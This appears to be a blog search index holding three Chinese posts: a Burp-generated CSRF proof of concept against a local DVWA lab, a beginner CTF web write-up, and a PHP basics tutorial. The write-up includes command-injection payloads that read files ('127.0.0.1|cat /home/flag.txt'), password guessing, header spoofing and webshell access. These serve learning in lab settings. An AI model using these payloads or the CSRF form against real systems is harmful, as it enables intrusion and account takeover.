<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>repport</title>
    <url>/2020/11/08/repport/</url>
    <content><![CDATA[<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="1234" />
      <input type="hidden" name="password&#95;conf" value="1234" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script type="text/javascript">
      document.getElementById("onclick_1").click();
    </script>
  </body>
</html>
]]></content>
  </entry>
  <entry>
    <title>第一周学习做题小结（攻防世界web入门）</title>
    <url>/2020/09/18/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98%E5%B0%8F%E7%BB%93%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    <content><![CDATA[<h2 id="攻防世界新手web题"><a href="#攻防世界新手web题" class="headerlink" title="攻防世界新手web题"></a>攻防世界新手web题</h2><h3 id="（一）view-source"><a href="#（一）view-source" class="headerlink" title="（一）view-source"></a>（一）view-source</h3><p><img src="https://img-blog.csdnimg.cn/202009131506121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>获取在线场景后，进入，这里有几种方法做题。<br><strong>第一种</strong> ：进入后，按F12打开控制器可以找到flag。<br><strong>第二种</strong> ：brupsuit抓包，在浏览器请求时抓取flag。<br><strong>第三种</strong> ：查看网页源代码。</p>
<h3 id="（二）get-post"><a href="#（二）get-post" class="headerlink" title="（二）get_post"></a>（二）get_post</h3><p><img src="https://img-blog.csdnimg.cn/20200913151019357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里我用的是火狐浏览器解决。<br>打开在线场景，在url后面加上 <code>?a=2</code> ,接着出现post内容，在浏览器搜索框下面打开Post data ，输入<code>b=4</code> 出现flag。</p>
<h3 id="（三）backup"><a href="#（三）backup" class="headerlink" title="（三）backup"></a>（三）backup</h3><p><img src="https://img-blog.csdnimg.cn/20200913151356863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php的备份文件名：如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” </span><br><span class="line">依次输入后缀名尝试。</span><br></pre></td></tr></table></figure>
<p>在输入index.php后页面没反应，然后依次尝试，发现输入.bak时提示下载.bak文件。下载打开发现flag。<br><img src="https://img-blog.csdnimg.cn/20200913151648879.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="（四）robots"><a href="#（四）robots" class="headerlink" title="（四）robots"></a>（四）robots</h3><p><img src="https://img-blog.csdnimg.cn/20200913152414648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入后发现页面空白，然后第一感觉查看网页源代码，发现<img src="https://img-blog.csdnimg.cn/20200913152726715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后就百度了一下robots，</p>
<blockquote>
<p>robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。</p>
</blockquote>
<p>那这样就直接在网站url后面加一个<code>robots.txt</code> 发现了一个名字为</p>
<p><img src="https://img-blog.csdnimg.cn/20200913152948922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着再次搜索url+<code>flag_1s_h3re.php</code> ，得到flag。</p>
<h3 id="（五）cookie"><a href="#（五）cookie" class="headerlink" title="（五）cookie"></a>（五）cookie</h3><blockquote>
<p> Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。</p>
</blockquote>
<p>打开题目，这题我知道两种解题方式。<br>第一种：打开在线场景，F12打开控制器，发现有一个look-here的cookie值为cookie.php。直接url后加<code>cookie.php</code> 搜索发现让我们看<code>http response</code> ，然后在http响应包里面发现头文件包含flag的信息。<br>第二种：brupsuit抓包。步骤和第一种差不多。<br><img src="https://img-blog.csdnimg.cn/20200913154308955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包后发现一个look-here的值，然后搜索url+<code>cookie.php</code> ，接着抓包，在其中发现flag。<br><img src="https://img-blog.csdnimg.cn/20200913154620406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="（六）disabled-button"><a href="#（六）disabled-button" class="headerlink" title="（六）disabled button"></a>（六）disabled button</h3><p>打开题目发现有一个flag按钮，这一题我当时是鼠标右键查看网页源代码，发现有个post方式。<br><img src="https://img-blog.csdnimg.cn/20200913154813462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="
"></p>
<p>于是就直接post<code>auth=flag</code> 得出flag。<br><img src="https://img-blog.csdnimg.cn/20200913154916964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在看了大佬们的讨论后，发现了另外一种方式。<br><strong>F12打开控制器，里面的html格式里有一个disable，选择之后删除，发现flag按钮可以点了，得出了flag。</strong></p>
<h3 id="（七）weak-auth"><a href="#（七）weak-auth" class="headerlink" title="（七）weak auth"></a>（七）weak auth</h3><p>打开之后给了一个登录的界面<br><img src="https://img-blog.csdnimg.cn/20200913155240661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>刚开始想试一下绕过的，发现提示了用户名是<code>admin</code>，然后就随手来了一个密码<code>123456</code>，突然就正确了，得到了flag。amazing！<br><img src="https://img-blog.csdnimg.cn/20200913155408235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后这道题做的话，可以用抓包来做，随便输入一个账户密码，brupsuit抓到后就对账户密码进行爆破，最后得到一个长度不一样的就是正确的，字典的话可以自己写一个，小弟知识有限就不在这里出丑了。</p>
<h3 id="（八）Ping"><a href="#（八）Ping" class="headerlink" title="（八）Ping"></a>（八）Ping</h3><p>题目提示<strong>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</strong><br>打开之后，直接ping了一下本机IP地址。ping通过了，然后接着顺带扫了一下带有<strong>“.txt”</strong> 的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1|find / -name <span class="string">"*.txt"</span></span><br></pre></td></tr></table></figure>
<p>得到了<img src="https://img-blog.csdnimg.cn/20200913160057532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后就查看flag文件的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat /home/flag.txt</span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/20200913160224991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>127.0.0.1</strong> ：</p>
<blockquote>
<p>127.0.0.1是回送地址，指本地机，一般用来测试使用。回送地址（127.x.x.x）是本机回送地址（Loopback Address），即主机IP堆栈内部的IP地址，主要用于网络软件测试以及本地机进程间通信，无论什么程序，一旦使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</p>
</blockquote>
<h3 id="（九）simple-php"><a href="#（九）simple-php" class="headerlink" title="（九）simple_php"></a>（九）simple_php</h3><p>听名字就知道是php方面简单的知识了，打开一看，果然不难，新手就是爽。<br>这个题考察的是PHP的函数绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">﻿<span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开是这样的，然后就百度一下<code>is_number()</code>函数，发现是判断目标是否为数字，是的话输出<strong>true</strong> 不是的话输出<strong>false</strong></p>
<blockquote>
<p>.is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回<br>FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真</p>
</blockquote>
<p>而题中所给代码首先需要满足 $a==0 $a两个条件<br>php中的弱类型比较会使’0dsafd’为真，所以输入这个时会输出flag1。<br>而输入<code>?a=0dsafd&amp;b=1235dcas</code> 则会出现flag<br><img src="https://img-blog.csdnimg.cn/20200913161611802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="（十）xff-referer"><a href="#（十）xff-referer" class="headerlink" title="（十）xff_referer"></a>（十）xff_referer</h3><p>刚拿到题目有点摸不着头脑，不知道怎么下手。然后本着习惯就先按了F12，我先按为敬了。然后发现自己好菜，就问了我万能的师傅-度娘。了解了一下 xff和referer。发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用我的菜鸟观来说，xff就是用来构造IP地址，referer就是让你构造的来源IP相应的来源浏览器，规定好像是使用www.google.com</span><br></pre></td></tr></table></figure>
<p>这样就好办了，直接在控制窗口网络页面重新发送一个请求，加入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>:<span class="number">123.123</span><span class="number">.123</span><span class="number">.123</span></span><br><span class="line">Referer:https:<span class="comment">//www.google.com</span></span><br></pre></td></tr></table></figure>
<p>然后发送请求，在HTML页面发现flag。<br><img src="https://img-blog.csdnimg.cn/20200913204725730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还有另外一种解法就是拿出咱们的神器<strong>brupsuit</strong> 来进行抓包。原理都是一样的。<br>进行抓包然后发送到referer，添加上面的玩意，然后<strong>GO</strong> 发送，在同样的地方拿到了一样的flag。就很nice。</p>
<h3 id="（十一）webshell"><a href="#（十一）webshell" class="headerlink" title="（十一）webshell"></a>（十一）webshell</h3><p>webshell，打开题目发现只有一个提示<br><img src="https://img-blog.csdnimg.cn/20200918003124550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>第一时间想到了<code>post</code>一个<code>shell=flag</code>试一下。发现并没有什么反应。然后联想题目提示PHP一句话。又想到了webshell后门。于是拿出了中国菜刀这个神器。<br><img src="https://img-blog.csdnimg.cn/20200918003741390.png#pic_center" alt="在这里插入图片描述"><br>直接添加url，密码<code>shell</code>，得到flag。</p>
<h3 id="（十二）simple-js"><a href="#（十二）simple-js" class="headerlink" title="（十二）simple_js"></a>（十二）simple_js</h3><p>这个题目完全的标题欺骗萌新，刚拿到就一直在研究其中的js代码。因为刚接触，就研究了一会才发现ji代码在这个题目中毫无用处。<br><img src="https://img-blog.csdnimg.cn/20200918004540724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看页面源代码，发现一串子疑似十六进制的字符。猜测是flag。就进行转换。<br>这里用的脚本，贪方便，就网上找了一个，接下来会研究python脚本的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line">print(a)</span><br><span class="line">b=a.split(<span class="string">","</span>)</span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    i=chr(int(i))</span><br><span class="line">    c+=i</span><br><span class="line">    print(c)</span><br></pre></td></tr></table></figure>
<p>运行得到flag。<br><img src="https://img-blog.csdnimg.cn/20200918004832480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再加上flag格式提交即可。</p>
]]></content>
  </entry>
  <entry>
    <title>PHP入门学习第四弹</title>
    <url>/2020/05/22/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%BC%B9/</url>
    <content><![CDATA[<p>@<a href="入门学习第四弹">TOC</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次对运算符以及循环语句进行了学习方面的总结，这次就进入函数和数组的学习了。</p>
<h1 id="switch语句、if-else语句"><a href="#switch语句、if-else语句" class="headerlink" title="switch语句、if else语句"></a>switch语句、if else语句</h1><p>个人感觉没啥好总结的，和其他语言上的用法差不多。</p>
<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">switch</span>($a)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"您给变量a赋值1！"</span>；</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"您给变量a赋值2！"</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span> :</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"未检测到您赋值操作!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($a&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"变量a的值大于0！"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>($a=<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"变量a的值等于0！"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"变量a的值小于0！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><p>在PHP中，函数是用<code>function</code>来定义的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($a,$b)</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $a+$b;</span><br><span class="line">   <span class="comment">//return ...</span></span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的<code>return</code>可以不写，也可以写。return是一个返回值，如果把函数中的<code>echo</code>改成<code>return</code>就无法输出，因为函数只是返回了这个值而不进行输出。</p>
<h2 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h2><blockquote>
<p>变量范围即它定义的上下文背景（也就是它的生效范围）。</p>
</blockquote>
<p>PHP的变量范围有<strong>局部变量、全局变量以及静态变量</strong>。</p>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>局部变量就是在函数中定义的变量，在函数的外部无法使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$a=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出的结果会提示错误。<br><strong>执行完毕后函数内部的动态变量都将被释放。</strong><br>也就是说在执行过后函数外部也可以定义一个同样名字的变量。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个就不会报错。</p>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全局变量就是在函数外定义的变量称为全局变量，作用域范围在定义变量开始到本程序文件的末尾。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	$b=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>不过这样直接在函数中引用全局变量会报错，需要用<code>global</code>关键字声明一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $a;</span><br><span class="line">	$b=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>在常量方面可以直接使用而不用像变量一样需要声明。</strong></p>
<h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>静态变量仅在局部函数域中存在，但当程序执行离开此作用域时，其值并不丢失。<br>在我理解就是，静态变量就是可以时刻刷新的变量。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> ++$a;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个代码中，会输出两次1。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">echo</span> ++$a;</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这次用<code>static</code>关键字声明之后，输出的结果就会变为<strong>2 3</strong> 。</p>
<h2 id="参数传递、可变函数"><a href="#参数传递、可变函数" class="headerlink" title="参数传递、可变函数"></a>参数传递、可变函数</h2><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、按值传参</span><br><span class="line"><span class="number">2</span>、引用传参</span><br><span class="line"><span class="number">3</span>、可变长度参数</span><br><span class="line"><span class="number">4</span>、函数的默认值</span><br></pre></td></tr></table></figure>
<h4 id="按值传参"><a href="#按值传参" class="headerlink" title="按值传参"></a>按值传参</h4><p>在PHP语言中，若不声明传参方式，默认使用的就是这个方式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">     $a=<span class="string">"这个是"</span>.$a;</span><br><span class="line">     <span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line">$i=<span class="string">"按值传参"</span>;</span><br><span class="line">test($i);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/ br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200521215510896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子做，不会影响变量<strong>i</strong>的值</p>
<h4 id="按引用传参"><a href="#按引用传参" class="headerlink" title="按引用传参"></a>按引用传参</h4><p>总结就是按引用传参会改变变量的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">(&amp;$a)</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> ++$a;</span><br><span class="line">&#125;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line">model($i);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>.$i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200521220124990.png" alt="在这里插入图片描述"></p>
<h4 id="可变长度参数"><a href="#可变长度参数" class="headerlink" title="可变长度参数"></a>可变长度参数</h4><p>是PHP提供给我们的可以直接使用的，主要有三个</p>
<blockquote>
<p>func_get_args();<br>func_get_arg();<br>func_num_args();</p>
</blockquote>
<p><strong>func_get_args()</strong> 是获取参数，个人理解是返回的是数组类型，<br><strong>func_get_args()</strong> 可以理解为获取数组中的某一个数值，需要加一个数字，<br><strong>func_num_args()</strong> 是返回的函数传入的参数的个数<br>在函数中直接调用输出的话目前学的是无法显示出来，可以用前面说的<strong>var_dump</strong>来查看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">()</span></span>&#123;</span><br><span class="line">   var_dump(func_get_args());</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   var_dump(func_get_arg(<span class="number">1</span>));</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">   var_dump(func_num_args());</span><br><span class="line">&#125;</span><br><span class="line">model(<span class="number">10</span>,<span class="string">"可变长度参数"</span>,<span class="number">12</span>,<span class="number">666</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200521234733324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="函数的默认值"><a href="#函数的默认值" class="headerlink" title="函数的默认值"></a>函数的默认值</h4><p>函数默认值就是在创建函数时就给函数里的变量赋予了一个值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">($a=<span class="string">"函数的默认值"</span>)</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> $a.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">model();</span><br><span class="line">model(<span class="number">20</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200521220650108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>在加默认值时，多个变量的话应该是从右往左加！！！</strong></p>
<h3 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h3><blockquote>
<p>可变函数不能用于例如echo、print、unset()、isset()、empty()、include、require以及类似的语言结构，需要使用自己的包装函数来将这些结构用作可变函数。</p>
</blockquote>
